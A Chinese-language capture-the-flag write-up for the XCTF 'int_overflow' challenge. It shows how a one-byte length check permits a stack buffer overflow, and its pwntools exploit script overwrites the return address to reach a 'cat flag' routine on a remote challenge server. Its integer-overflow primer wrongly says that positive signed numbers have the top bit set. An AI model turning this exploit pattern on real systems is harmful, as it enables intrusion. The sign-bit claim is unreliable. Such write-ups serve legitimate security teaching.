
# XCTF攻防世界int_overflow

## int_overflow题解

首先，进行程序基本信息检查：

![](upload/attach/201910/779730_4NJD6KPGTZ37VGX.png)

没有`canary`，没有`PIE`。程序执行是先选择一个子流程，然后输入`username`，再输入`passwd`。这里要考虑程序是否会对输入的字符串的长度进行限制，先留心一下。

IDA查看一下源码：

- 首先看一下`strings`：

![](upload/attach/201910/779730_VJ7YT7TNQDPVZB7.png)

有收获，存在几个危险函数，而且存在"`cat flag`" ，可以考虑直接调用。

- 进`main`函数看一下：

![](upload/attach/201910/779730_EYAUC5SJSX987WN.png)

没有发现什么大问题，直接进`login`。

![](upload/attach/201910/779730_AJ3ETFPX662VY4S.png)

需要留心一下，`username`和`passwd`都做了最大长度限制。但是`passwd`的长度未免太长了吧。。。太可疑。

- 进入`check_passwd`查看对`passwd`的处理：

![](upload/attach/201910/779730_UAS9244W8AMA4TQ.png)

到这里就很明显了，函数首先设定了`v3`变量，但是大小只有一个字节，共8bit。前面对`passwd`进行长度限制时，最大长度为`0x199`，这很明显一个字节存储不下。那么会发生什么呢？整数溢出。（后续会给出整数溢出的相关知识介绍）

输入的`passwd`的长度给到`v3`，进行判断，因为存在整数溢出，所以这里输入的字符的个数不管是3～8还是259～264都是可以通过验证的。再往下，使用`strcpy`将`passwd`拷贝进`stack`中，`stack`中给出的保存`passwd`的大小为`0x14` :

![](upload/attach/201910/779730_RK38PUSDHAFZYHQ.png)

如果输入的`passwd`的字符个数超过了`0x14`，那么就会覆盖到`stack`中的内容。

- 覆盖数据计算：

思路已经确定，利用整数溢出漏洞来输入大量的`passwd`字符造成栈溢出。具体长度只要在259～264之间即可。此处选择262。看一下汇编确认具体的填充数据结构：

![](upload/attach/201910/779730_JV5KCP63RCUHCJV.png)

![](upload/attach/201910/779730_SS6PZK4AZWCD8XG.png)

从汇编代码中可以看到，想要覆盖到返回地址，先使用`0x14`个数据覆盖`stack`拷贝的`passed`的内存区域，然后使用4字节数据覆盖`ebp`，再使用"`cat flag`"的地址覆盖返回地址，最后接上262剩余的数据即可。

![](upload/attach/201910/779730_UBKXCAPGTGAUZ27.png)

所以`payload`的构成为：

```
payload = "A"*0x14 +"AAAA"+ P32(cat_flag_addr) + "A"*234(262-0x14-4-4)
```

## EXP:

```
from pwn import *
sh=remote('111.198.29.45',44241)
sh.sendlineafter("choice:","1")
sh.sendlineafter("username:\n","xctf")
cat_flag_addr = 0x08048694
payload = "A" * 0x14 + "AAAA" + p32(cat_flag_addr) + "A" * 234
sh.sendlineafter("passwd:\n",payload)
print sh.recvall()
```

## 整数溢出的相关知识

整数分为有符号和无符号两种类型，有符号数以最高位作为其符号位，即正整数 最高位为1，负数为0，无符号数取值范围为非负数，常见各类型占用字节数如下:

![](upload/attach/201910/779730_PUZZTNF5PHRSFGW.png)

对于`unsigned short int`类型的数据，`var1 = 1`，`var2 = 65537`，用计算器看一下：

![](upload/attach/201910/779730_YEQTZB58V33R45T.png)

![](upload/attach/201910/779730_V6B35YEBZCCA5YN.png)

`65537`会发生高位截断，截断之后最高位的1被舍弃，这样数据就变成了1。使用代码验证一下：

```
#include <stdio.h>
int main(){
unsigned short int a = 1;
unsigned short int b = 65537;
if(a == b){
printf("Int overflow sucssesfully!\n");
}
return 0;
}
```

编译运行之后如下：

![](upload/attach/201910/779730_DGJF9FJXB2KUSQ9.png)

也就是说，对于一个2字节的`unsigned short int`型变量，它的有效数据长度为2个字节，当它的数据长度超过2个字节时，就发生溢出，溢出的部分则直接忽略。使用相关变量时，使用的数据仅为最后2个字节，因此就会出现`65537`等于`1`的情况，其他类型变量和数值与之类似，更为详细的说明可以参考`ctf-all-in-one`。
